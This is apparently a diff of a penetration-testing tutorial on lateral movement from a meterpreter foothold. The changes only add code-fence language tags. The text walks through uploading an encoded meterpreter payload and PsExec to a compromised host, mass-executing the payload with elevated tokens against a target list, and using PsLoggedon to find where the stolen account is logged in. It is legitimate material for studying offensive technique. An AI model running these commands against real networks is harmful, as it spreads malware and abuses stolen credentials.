@@ -6,7 +6,7 @@ For this example, lets just assume that you have gotten a meterpreter shell on a
 
 For starters we can turn to PsExec. PsExec will allow us to run commands against a remote machine, and comes with a handly little option, -h.
 
-```
+```bash
  -h   If the target system is Vista or higher, has the process
 	  run with the account's elevated token, if available.
 ```
@@ -15,20 +15,20 @@ Seems handy for what were planning to do. Before we dive in though, I want to qu
 
 Continuing on, the first step that we want to do is upload a copy of PsExec.exe and an encoded copy of a malicious meterepreter exe (see the Veil project for details on how to do this) up to the server. To do this, we could do:
 
-```
+```bash
 upload *path to meterpreter exe* \\users\\*target user here*\\metpr.exe
 upload *path to PsExec.exe* \\users\\*target user here*\\PsExec.exe
 ```
 
 The next step to do is to gather a list of target IP addresses that you would like to try using your exploited user's authentication credentials against. Once you have done this, save it to a file (targets.txt in our example) and upload it to Box0. 
 
-```
+```bash
 upload *path to targets.txt* \\users\\*target user here*\\targets.txt
 ```
 
 We then can run PsExec.exe as follows:
 
-```
+```bash
 PsExec.exe @targets.txt -accepteula -c -f -h -d metr.exe
 ```
 
@@ -47,7 +47,7 @@ We do have a slight problem though. Due to something called the double hop issue
 
 We now need to find another host where our user is running with a primary token so that we can escalate privileges on Box0. To do this, we will use PsLoggedon.exe from same PsTools suite that PsExec.exe comes from. Taking the targets.txt file that we created, here is the command to pass through the credentials of our currently compromized user and find out where else he/she is logged in:
 
-```
+```bash
 for /F %i in (targets.txt) do @PsLoggedon.exe \\%i 2>NUL | find "*compromized user's name goes here*" >NUL && echo %i
 ```
 
